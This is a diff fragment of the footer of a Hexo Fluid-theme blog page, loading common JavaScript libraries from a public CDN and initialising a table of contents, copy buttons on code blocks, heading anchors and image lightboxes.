+<script  src="https://lib.baomitu.com/twitter-bootstrap/4.6.1/js/bootstrap.min.js" ></script>
+<script  src="/js/events.js" ></script>
+<script  src="/js/plugins.js" ></script>
+
+
+  <script  src="https://lib.baomitu.com/typed.js/2.0.12/typed.min.js" ></script>
+  <script>
+    (function (window, document) {
+      var typing = Fluid.plugins.typing;
+      var subtitle = document.getElementById('subtitle');
+      if (!subtitle || !typing) {
+        return;
+      }
+      var text = subtitle.getAttribute('data-typed-text');
+      
+        typing(text);
+      
+    })(window, document);
+  </script>
+
+
+
+
+
+
+  
+    <script  src="/js/img-lazyload.js" ></script>
+  
+
+
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/tocbot/4.18.2/tocbot.min.js', function() {
+    var toc = jQuery('#toc');
+    if (toc.length === 0 || !window.tocbot) { return; }
+    var boardCtn = jQuery('#board-ctn');
+    var boardTop = boardCtn.offset().top;
+
+    window.tocbot.init({
+      tocSelector     : '#toc-body',
+      contentSelector : '.markdown-body',
+      headingSelector : CONFIG.toc.headingSelector || 'h1,h2,h3,h4,h5,h6',
+      linkClass       : 'tocbot-link',
+      activeLinkClass : 'tocbot-active-link',
+      listClass       : 'tocbot-list',
+      isCollapsedClass: 'tocbot-is-collapsed',
+      collapsibleClass: 'tocbot-is-collapsible',
+      collapseDepth   : CONFIG.toc.collapseDepth || 0,
+      scrollSmooth    : true,
+      headingsOffset  : -boardTop
+    });
+    if (toc.find('.toc-list-item').length > 0) {
+      toc.css('visibility', 'visible');
+    }
+  });
+</script>
+
+
+  <script>
+  (function() {
+    var enableLang = CONFIG.code_language.enable && CONFIG.code_language.default;
+    var enableCopy = CONFIG.copy_btn;
+    if (!enableLang && !enableCopy) {
+      return;
+    }
+
+    function getBgClass(ele) {
+      return Fluid.utils.getBackgroundLightness(ele) >= 0 ? 'code-widget-light' : 'code-widget-dark';
+    }
+
+    var copyTmpl = '';
+    copyTmpl += '<div class="code-widget">';
+    copyTmpl += 'LANG';
+    copyTmpl += '</div>';
+    jQuery('.markdown-body pre').each(function() {
+      var $pre = jQuery(this);
+      if ($pre.find('code.mermaid').length > 0) {
+        return;
+      }
+      if ($pre.find('span.line').length > 0) {
+        return;
+      }
+
+      var lang = '';
+
+      if (enableLang) {
+        lang = CONFIG.code_language.default;
+        if ($pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2 && $pre.children().hasClass('hljs')) {
+          lang = $pre[0].children[0].classList[1];
+        } else if ($pre[0].getAttribute('data-language')) {
+          lang = $pre[0].getAttribute('data-language');
+        } else if ($pre.parent().hasClass('sourceCode') && $pre[0].children.length > 0 && $pre[0].children[0].classList.length >= 2) {
+          lang = $pre[0].children[0].classList[1];
+          $pre.parent().addClass('code-wrapper');
+        } else if ($pre.parent().hasClass('markdown-body') && $pre[0].classList.length === 0) {
+          $pre.wrap('<div class="code-wrapper"></div>');
+        }
+        lang = lang.toUpperCase().replace('NONE', CONFIG.code_language.default);
+      }
+      $pre.append(copyTmpl.replace('LANG', lang).replace('code-widget">',
+        getBgClass($pre[0]) + (enableCopy ? ' code-widget copy-btn" data-clipboard-snippet><i class="iconfont icon-copy"></i>' : ' code-widget">')));
+
+      if (enableCopy) {
+        Fluid.utils.createScript('https://lib.baomitu.com/clipboard.js/2.0.10/clipboard.min.js', function() {
+          var clipboard = new window.ClipboardJS('.copy-btn', {
+            target: function(trigger) {
+              var nodes = trigger.parentNode.childNodes;
+              for (var i = 0; i < nodes.length; i++) {
+                if (nodes[i].tagName === 'CODE') {
+                  return nodes[i];
+                }
+              }
+            }
+          });
+          clipboard.on('success', function(e) {
+            e.clearSelection();
+            e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-copy', 'icon-success');
+            setTimeout(function() {
+              e.trigger.innerHTML = e.trigger.innerHTML.replace('icon-success', 'icon-copy');
+            }, 2000);
+          });
+        });
+      }
+    });
+  })();
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/anchor-js/4.3.1/anchor.min.js', function() {
+    window.anchors.options = {
+      placement: CONFIG.anchorjs.placement,
+      visible  : CONFIG.anchorjs.visible
+    };
+    if (CONFIG.anchorjs.icon) {
+      window.anchors.options.icon = CONFIG.anchorjs.icon;
+    }
+    var el = (CONFIG.anchorjs.element || 'h1,h2,h3,h4,h5,h6').split(',');
+    var res = [];
+    for (var item of el) {
+      res.push('.markdown-body > ' + item.trim());
+    }
+    if (CONFIG.anchorjs.placement === 'left') {
+      window.anchors.options.class = 'anchorjs-link-left';
+    }
+    window.anchors.add(res.join(', '));
+  });
+</script>
+
+
+  
+<script>
+  Fluid.utils.createScript('https://lib.baomitu.com/fancybox/3.5.7/jquery.fancybox.min.js', function() {
+    Fluid.plugins.fancyBox();
+  });
+</script>
+
+
+  <script>Fluid.plugins.imageCaption();</script>
+
+  <script  src="/js/local-search.js" ></script>
+
+
+
+
+
+<!-- 主题的启动项，将它保持在最底部 -->
+<!-- the boot of the theme, keep it at the bottom -->
+<script  src="/js/boot.js" ></script>
+
+
+  
+
+  <noscript>
+    <div class="noscript-warning">博客在允许 JavaScript 运行的环境下浏览效果更佳</div>
+  </noscript>
+</body>
+</html>
